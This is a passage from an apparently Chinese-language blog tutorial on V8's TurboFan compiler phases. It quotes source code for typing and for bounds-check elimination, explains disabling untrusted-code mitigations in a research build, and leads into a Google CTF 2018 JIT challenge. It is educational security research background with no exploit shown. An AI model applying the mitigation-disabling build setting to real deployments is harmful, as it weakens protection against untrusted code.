 RunPrintAndVerify(LoopExitEliminationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_load_elimination) &#123;</span><br><span class="line">    Run&lt;LoadEliminationPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(LoadEliminationPhase::phase_name());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_escape) &#123;</span><br><span class="line">    Run&lt;EscapeAnalysisPhase&gt;();</span><br><span class="line">    <span class="keyword">if</span> (data-&gt;compilation_failed()) &#123;</span><br><span class="line">      info()-&gt;AbortOptimization(</span><br><span class="line">          BailoutReason::kCyclicObjectStateDetectedInEscapeAnalysis);</span><br><span class="line">      data-&gt;EndPhaseKind();</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    RunPrintAndVerify(EscapeAnalysisPhase::phase_name());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform simplified lowering. This has to run w/o the Typer decorator,</span></span><br><span class="line">  <span class="comment">// because we cannot compute meaningful types anyways, and the computed types</span></span><br><span class="line">  <span class="comment">// might even conflict with the representation/truncation logic.</span></span><br><span class="line">  Run&lt;SimplifiedLoweringPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(SimplifiedLoweringPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// From now on it is invalid to look at types on the nodes, because the types</span></span><br><span class="line">  <span class="comment">// on the nodes might not make sense after representation selection due to the</span></span><br><span class="line">  <span class="comment">// way we handle truncations; if we'd want to look at types afterwards we'd</span></span><br><span class="line">  <span class="comment">// essentially need to re-type (large portions of) the graph.</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// In order to catch bugs related to type access after this point, we now</span></span><br><span class="line">  <span class="comment">// remove the types from the nodes (currently only in Debug builds).</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  Run&lt;UntyperPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(UntyperPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run generic lowering pass.</span></span><br><span class="line">  Run&lt;GenericLoweringPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(GenericLoweringPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  data-&gt;BeginPhaseKind(<span class="string">"block building"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run early optimization pass.</span></span><br><span class="line">  Run&lt;EarlyOptimizationPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(EarlyOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  Run&lt;EffectControlLinearizationPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(EffectControlLinearizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_store_elimination) &#123;</span><br><span class="line">    Run&lt;StoreStoreEliminationPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(StoreStoreEliminationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Optimize control flow.</span></span><br><span class="line">  <span class="keyword">if</span> (FLAG_turbo_cf_optimization) &#123;</span><br><span class="line">    Run&lt;ControlFlowOptimizationPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(ControlFlowOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Optimize memory access and allocation operations.</span></span><br><span class="line">  Run&lt;MemoryOptimizationPhase&gt;();</span><br><span class="line">  <span class="comment">// TODO(jarin, rossberg): Remove UNTYPED once machine typing works.</span></span><br><span class="line">  RunPrintAndVerify(MemoryOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Lower changes that have been inserted before.</span></span><br><span class="line">  Run&lt;LateOptimizationPhase&gt;();</span><br><span class="line">  <span class="comment">// TODO(jarin, rossberg): Remove UNTYPED once machine typing works.</span></span><br><span class="line">  RunPrintAndVerify(LateOptimizationPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  data-&gt;source_positions()-&gt;RemoveDecorator();</span><br><span class="line">  <span class="keyword">if</span> (data-&gt;info()-&gt;trace_turbo_json_enabled()) &#123;</span><br><span class="line">    data-&gt;node_origins()-&gt;RemoveDecorator();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ComputeScheduledGraph();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> SelectInstructions(linkage);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于上面两个函数涉及到的<code>Phase</code>众多，这里请各位自行阅读源码来了解各个Phase的具体功能。</p>
<p>接下来我们只介绍几个比较重要的<code>Phases</code>：<code>GraphBuilderPhase</code>、<code>TyperPhase</code>和<code>SimplifiedLoweringPhase</code>。</p>
<h3 id="2-GraphBuilderPhase">2. GraphBuilderPhase</h3>
<ul>
<li>
<p><code>GraphBuilderPhase</code>将遍历字节码，并建一个初始的图，这个图将用于接下来Phase的处理，包括但不限于各种代码优化。</p>
</li>
<li>
<p>一个简单的例子</p>
<p><img src="/2021/01/v8-turboFan/bytecodegraphbuilder.png" alt="img"></p>
</li>
</ul>
<h3 id="3-TyperPhase">3. TyperPhase</h3>
<ul>
<li>
<p><code>TyperPhase</code>将会遍历整个图的所有结点，并给每个结点设置一个<code>Type</code>属性，该操作将在建图完成后被执行</p>
<blockquote>
<p>给每个结点设置Type的操作是不是极其类似于编译原理中的语义分析呢？ XD</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">PipelineImpl::CreateGraph</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(GraphBuilderPhase::phase_name(), <span class="literal">true</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    <span class="function">Typer <span class="title">typer</span><span class="params">(isolate(), data-&gt;js_heap_broker(), flags, data-&gt;graph())</span></span>;</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(TyperPhase::phase_name());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中，具体执行的是<code>TyperPhase::Run</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TyperPhase</span> &#123;</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">"typer"</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone, Typer* typer)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    typer-&gt;Run(roots, &amp;induction_vars);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>在该函数中继续调用<code>Typer::Run</code>函数，并在<code>GraphReducer::ReduceGraph</code>函数中最终调用到<code>Typer::Visitor::Reduce</code>函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Typer::Run</span><span class="params">(<span class="keyword">const</span> NodeVector&amp; roots,</span></span></span><br><span class="line"><span class="function"><span class="params">                LoopVariableOptimizer* induction_vars)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="function">Visitor <span class="title">visitor</span><span class="params">(<span class="keyword">this</span>, induction_vars)</span></span>;</span><br><span class="line">  <span class="function">GraphReducer <span class="title">graph_reducer</span><span class="params">(zone(), graph())</span></span>;</span><br><span class="line">  graph_reducer.AddReducer(&amp;visitor);</span><br><span class="line">  <span class="keyword">for</span> (Node* <span class="keyword">const</span> root : roots) graph_reducer.ReduceNode(root);</span><br><span class="line">  graph_reducer.ReduceGraph();</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>Typer::Visitor::Reduce</code>函数中存在一个较大的switch结构，通过该switch结构，当Visitor遍历每个node时，即可最终调用到对应的<code>XXXTyper</code>函数。</p>
<blockquote>
<p>例如，对于一个JSCall结点，将在TyperPhase中最终调用到<code>Typer::Visitor::JSCallTyper</code></p>
</blockquote>
</li>
<li>
<p>这里我们简单看一下<code>JSCallTyper</code>函数源码，该函数中存在一个很大的switch结构，该结构将设置每个<code>Builtin</code>函数结点的<code>Type</code>属性，即函数的返回值类型。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!fun.IsHeapConstant() || !fun.AsHeapConstant()-&gt;Ref().IsJSFunction()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NonInternal();</span><br><span class="line">  &#125;</span><br><span class="line">  JSFunctionRef function = fun.AsHeapConstant()-&gt;Ref().AsJSFunction();</span><br><span class="line">  <span class="keyword">if</span> (!function.shared().HasBuiltinFunctionId()) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NonInternal();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">switch</span> (function.shared().builtin_function_id()) &#123;</span><br><span class="line">    <span class="keyword">case</span> BuiltinFunctionId::kMathRandom:</span><br><span class="line">      <span class="keyword">return</span> Type::PlainNumber();</span><br><span class="line">  <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>而对于一个常数<code>NumberConstant</code>类型，<code>TyperPhase</code>也会打上一个对应的类型</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Type Typer::Visitor::TypeNumberConstant(Node* node) </span><br><span class="line">  <span class="comment">// 注意这里使用的是double，这也就说明了为什么Number.MAX_SAFE_INTEGER = 9007199254740991</span></span><br><span class="line">  <span class="keyword">double</span> number = OpParameter&lt;<span class="keyword">double</span>&gt;(node-&gt;op());</span><br><span class="line">  <span class="keyword">return</span> Type::NewConstant(number, zone());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而在<code>Type::NewConstant</code>函数中，我们会发现一个神奇的设计：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Type <span class="title">Type::NewConstant</span><span class="params">(<span class="keyword">double</span> value, Zone* zone)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 对于一个正常的整数</span></span><br><span class="line">  <span class="keyword">if</span> (RangeType::IsInteger(value)) &#123;</span><br><span class="line">    <span class="comment">// 实际上所设置的Type是一个range！</span></span><br><span class="line">    <span class="keyword">return</span> Range(value, value, zone);</span><br><span class="line">  <span class="comment">// 否则如果是一个异常的-0,则返回对应的MinusZero</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (IsMinusZero(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::MinusZero();</span><br><span class="line">  <span class="comment">// 如果是NAN，则返回NaN</span></span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">std</span>::isnan(value)) &#123;</span><br><span class="line">    <span class="keyword">return</span> Type::NaN();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DCHECK(OtherNumberConstantType::IsOtherNumberConstant(value));</span><br><span class="line">  <span class="keyword">return</span> OtherNumberConstant(value, zone);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于JS代码中的一个NumberConstant，<strong>实际上设置的Type是一个Range</strong>，只不过这个Range的首尾范围均是该数，例如<code>NumberConstant(3) =&gt; Range(3, 3, zone)</code></p>
</li>
<li>
<p>以下这张图可以证明<code>TyperPhase</code>正如预期那样执行：</p>
<p><img src="/2021/01/v8-turboFan/typer.png" alt="img"></p>
</li>
<li>
<p>与之相应的，v8采用了SSA。因此对于一个Phi结点，它将设置该节点的Type为几个可能值的Range的并集。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Type Typer::Visitor::TypePhi(Node* node) &#123;</span><br><span class="line">  <span class="keyword">int</span> arity = node-&gt;op()-&gt;ValueInputCount();</span><br><span class="line">  Type type = Operand(node, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; arity; ++i) &#123;</span><br><span class="line">    type = Type::Union(type, Operand(node, i), zone());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>请看以下示例：</p>
<p><img src="/2021/01/v8-turboFan/phi.png" alt="img"></p>
</li>
</ul>
<h3 id="4-SimplifiedLoweringPhase">4. SimplifiedLoweringPhase</h3>
<ul>
<li>
<p><code>SimplifiedLoweringPhase</code>会遍历结点做一些处理，同时也会对图做一些优化操作。</p>
<p>这里我们只关注该<code>Phase</code>优化<code>CheckBound</code>的细节，因为<code>CheckBound</code>通常是用于判断 JS数组（例如ArrayBuffer） 是否越界使用  所设置的结点。</p>
</li>
<li>
<p>首先我们可以通过以下路径来找到优化<code>CheckBound</code>的目标代码：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SimplifiedLoweringPhase::Run</span><br><span class="line">    SimplifiedLowering::LowerAllNodes</span><br><span class="line">      RepresentationSelector::Run</span><br><span class="line">        RepresentationSelector::VisitNode</span><br></pre></td></tr></table></figure>
<p>目标代码如下:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Dispatching routine for visiting the node &#123;node&#125; with the usage &#123;use&#125;.</span></span><br><span class="line">  <span class="comment">// Depending on the operator, propagate new usage info to the inputs.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">VisitNode</span><span class="params">(Node* node, Truncation truncation,</span></span></span><br><span class="line"><span class="function"><span class="params">                SimplifiedLowering* lowering)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Unconditionally eliminate unused pure nodes (only relevant if there's</span></span><br><span class="line">    <span class="comment">// a pure operation in between two effectful ones, where the last one</span></span><br><span class="line">    <span class="comment">// is unused).</span></span><br><span class="line">    <span class="comment">// Note: We must not do this for constants, as they are cached and we</span></span><br><span class="line">    <span class="comment">// would thus kill the cached &#123;node&#125; during lowering (i.e. replace all</span></span><br><span class="line">    <span class="comment">// uses with Dead), but at that point some node lowering might have</span></span><br><span class="line">    <span class="comment">// already taken the constant &#123;node&#125; from the cache (while it was in</span></span><br><span class="line">    <span class="comment">// a sane state still) and we would afterwards replace that use with</span></span><br><span class="line">    <span class="comment">// Dead as well.</span></span><br><span class="line">    <span class="keyword">if</span> (node-&gt;op()-&gt;ValueInputCount() &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        node-&gt;op()-&gt;HasProperty(Operator::kPure)) &#123;</span><br><span class="line">      <span class="keyword">if</span> (truncation.IsUnused()) <span class="keyword">return</span> VisitUnused(node);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">switch</span> (node-&gt;opcode()) &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">case</span> IrOpcode::kCheckBounds: &#123;</span><br><span class="line">            <span class="keyword">const</span> CheckParameters&amp; p = CheckParametersOf(node-&gt;op());</span><br><span class="line">            Type index_type = TypeOf(node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">            Type length_type = TypeOf(node-&gt;InputAt(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">if</span> (index_type.Is(Type::Integral32OrMinusZero())) &#123;</span><br><span class="line">              <span class="comment">// Map -0 to 0, and the values in the [-2^31,-1] range to the</span></span><br><span class="line">              <span class="comment">// [2^31,2^32-1] range, which will be considered out-of-bounds</span></span><br><span class="line">              <span class="comment">// as well, because the &#123;length_type&#125; is limited to Unsigned31.</span></span><br><span class="line">              VisitBinop(node, UseInfo::TruncatingWord32(),</span><br><span class="line">                        MachineRepresentation::kWord32);</span><br><span class="line">              <span class="keyword">if</span> (lower() &amp;&amp; lowering-&gt;poisoning_level_ ==</span><br><span class="line">                                PoisoningMitigationLevel::kDontPoison) &#123;</span><br><span class="line">                <span class="comment">// 可以看到，如果当前索引的最大值小于length的最小值，则表示当前索引的使用没有越界</span></span><br><span class="line">                <span class="keyword">if</span> (index_type.IsNone() || length_type.IsNone() ||</span><br><span class="line">                    (index_type.Min() &gt;= <span class="number">0.0</span> &amp;&amp;</span><br><span class="line">                    index_type.Max() &lt; length_type.Min())) &#123;</span><br><span class="line">                  <span class="comment">// The bounds check is redundant if we already know that</span></span><br><span class="line">                  <span class="comment">// the index is within the bounds of [0.0, length[.</span></span><br><span class="line">                  <span class="comment">// CheckBound将会被优化</span></span><br><span class="line">                  DeferReplacement(node, node-&gt;InputAt(<span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              VisitBinop(</span><br><span class="line">                  node,</span><br><span class="line">                  UseInfo::CheckedSigned32AsWord32(kIdentifyZeros, p.feedback()),</span><br><span class="line">                  UseInfo::TruncatingWord32(), MachineRepresentation::kWord32);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line">    <span class="comment">// ....</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，在<code>CheckBound</code>的优化判断逻辑中，如果当前索引的最大值小于length的最小值，则表示当前索引的使用没有越界，此时将会移除<code>CheckBound</code>结点以简化IR图。</p>
<blockquote>
<p>需要注意NumberConstant结点的Type是一个Range类型，因此才会有最大值Max和最小值Min的概念。</p>
</blockquote>
</li>
<li>
<p>这里需要解释一下环境搭配中所说的，为什么要<strong>添加一个编译参数<code>v8_optimized_debug = false</code></strong>，注意看上面判断条件中的这行条件</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (lower() &amp;&amp; lowering-&gt;poisoning_level_ ==</span><br><span class="line">                                  PoisoningMitigationLevel::kDontPoison)</span><br></pre></td></tr></table></figure>
<p><code>visitNode</code>时有三个状态，分别是<code>Phase::PROPAGATE</code>（信息收集）、<code>Phase::RETYPE</code>（从类型反馈中获取类型）以及<code>Phase::LOWER</code>（开始优化）。当真正<strong>开始优化</strong>时，<code>lower()</code>条件自然成立，因此我们无需处理这个。</p>
<p>但对于下一个条件，通过动态调试可以得知，<code>poisoning_level</code>始终不为<code>PoisoningMitigationLevel::kDontPoison</code>。通过追溯<code>lowering-&gt;poisoning_level_</code>，我们可以发现它实际上在<code>PipelineCompilationJob::PrepareJobImpl</code>中被设置</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PipelineCompilationJob::Status <span class="title">PipelineCompilationJob::PrepareJobImpl</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    Isolate* isolate)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// Compute and set poisoning level.</span></span><br><span class="line">  PoisoningMitigationLevel load_poisoning =</span><br><span class="line">      PoisoningMitigationLevel::kDontPoison;</span><br><span class="line">  <span class="keyword">if</span> (FLAG_branch_load_poisoning) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonAll;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (FLAG_untrusted_code_mitigations) &#123;</span><br><span class="line">    load_poisoning = PoisoningMitigationLevel::kPoisonCriticalOnly;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>FLAG_branch_load_poisoning</code>始终为<code>false</code>，<code>FLAG_untrusted_code_mitigations</code>始终为<code>true</code></p>
<blockquote>
<p>编译参数v8_untrusted_code_mitigations 默认 true，使得宏DISABLE_UNTRUSTED_CODE_MITIGATIONS没有被定义，因此默认设置<code>FLAG_untrusted_code_mitigations = true</code></p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// v8/src/flag-definitions.h</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置`FLAG_untrusted_code_mitigations`</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DISABLE_UNTRUSTED_CODE_MITIGATIONS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS false</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS true</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">DEFINE_BOOL(untrusted_code_mitigations, V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS,</span><br><span class="line">            <span class="string">"Enable mitigations for executing untrusted code"</span>)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> V8_DEFAULT_UNTRUSTED_CODE_MITIGATIONS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置`FLAG_branch_load_poisoning`</span></span><br><span class="line">DEFINE_BOOL(branch_load_poisoning, <span class="literal">false</span>, <span class="string">"Mask loads with branch conditions."</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># BUILD.gn</span></span><br><span class="line">declare_args() &#123;</span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line">  <span class="comment"># Enable mitigations for executing untrusted code.</span></span><br><span class="line">  <span class="comment"># 默认为true</span></span><br><span class="line">  v8_untrusted_code_mitigations = true</span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line"><span class="keyword">if</span> (!v8_untrusted_code_mitigations) &#123;</span><br><span class="line">    defines += [ <span class="string">"DISABLE_UNTRUSTED_CODE_MITIGATIONS"</span> ]</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
<p>这样就会使得<code>load_poisoning</code>始终为<code>PoisoningMitigationLevel::kPoisonCriticalOnly</code>，因此始终无法执行<code>checkBounds</code>的优化操作。所以我们需要手动设置编译参数<code>v8_untrusted_code_mitigations = false</code>，以启动checkbounds的优化。</p>
</li>
<li>
<p>以下是一个简单checkbounds优化的例子</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> arr = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>, <span class="number">5.5</span>);</span><br><span class="line">  <span class="keyword">let</span> t = <span class="number">1</span> + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> arr[t];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br><span class="line">%OptimizeFunctionOnNextCall(f);</span><br><span class="line"><span class="built_in">console</span>.log(f(<span class="number">1</span>));</span><br></pre></td></tr></table></figure>
<p>优化前发现存在一个checkBounds：</p>
<p><img src="/2021/01/v8-turboFan/checkbounds1.png" alt="img"></p>
<p>执行完<code>SimplifiedLoweringPhase</code>后，<code>CheckBounds</code>被优化了:</p>
<p><img src="/2021/01/v8-turboFan/checkbounds2.png" alt="img"></p>
</li>
</ul>
<blockquote>
<p>基础概念介绍到这里，接下来我们学习一道CTF题来练练手。</p>
</blockquote>
<h2 id="六、Google-CTF-2018-final-Just-In-Time">六、Google CTF 2018(final) Just-In-Time</h2>
